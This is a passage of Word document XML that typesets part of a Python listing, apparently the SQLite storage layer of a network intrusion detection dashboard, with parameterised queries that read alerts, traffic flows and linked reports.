          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "INSERT INTO chat (report_id, role, content, created_at) VALUES (?,?,?,?)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6783C342">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                (report_id, role, content, time.time()),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A9B5F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190A0FDA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return int(cur.lastrowid)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CA1720">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02A0BDE6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # ---------------------------------------------------------------- 读取</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FAA524A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E7B66B8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def alerts(self, limit=100, probe_id=None, category=None, since=None) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3AE549">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sql = "SELECT * FROM alerts WHERE 1=1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E0BF69E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        params = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B41C486">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if probe_id:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A06158">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sql += " AND probe_id=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B228B1F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            params.append(probe_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8C9812">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if category:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6384C1E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sql += " AND category=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AFF969A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            params.append(category)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65C49A49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if since:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BAD39FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sql += " AND created_at&gt;=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31583371">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            params.append(since)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A535B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sql += " ORDER BY id DESC LIMIT ?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AD4AE9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        params.append(limit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48614CF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E713890">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return [_row_to_dict(r) for r in conn.execute(sql, params)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02919E08">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F552D81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def flows(self, limit=200, probe_id=None, since=None) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DAB013">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """流水表用的轻量查询：78 维特征只留几列展示字段，别整包塞给看板。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02544CC1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sql = "SELECT * FROM flows WHERE 1=1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE1F42C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        params = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A16D497">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if probe_id:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACD1001">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sql += " AND probe_id=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7445810F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            params.append(probe_id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5098D8FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if since:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C39C30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            sql += " AND created_at&gt;=?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="570DF323">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            params.append(since)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="326E0B77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sql += " ORDER BY id DESC LIMIT ?"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B422F8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        params.append(limit)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BE9947B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        out = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19077547">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCB9A98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            for row in conn.execute(sql, params):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B3086FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                d = _row_to_dict(row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5F9986">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                feats = d.pop("features", {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36411FAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                d["summary"] = {k: feats[k] for k in FLOW_DISPLAY_FIELDS if k in feats}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7270F307">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                out.append(d)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AED1C01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7AE5F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EEE56E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def alert(self, alert_id) -&gt; dict | None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FF37C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BC71E60">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            row = conn.execute("SELECT * FROM alerts WHERE id=?", (alert_id,)).fetchone()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DE9994">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return _row_to_dict(row) if row else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C9AA6DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14377B81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def report_for_alert(self, alert_id) -&gt; dict | None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6151A3B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74241819">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            row = conn.execute(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396F7D0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "SELECT * FROM reports WHERE alert_id=? ORDER BY id DESC LIMIT 1", (alert_id,)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7D5099">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            ).fetchone()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7637DCF8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return _row_to_dict(row) if row else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="666EECB3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44C2DE28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def report(self, report_id) -&gt; dict | None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC00BE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        with self.connect() as conn:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="270AD2B3">
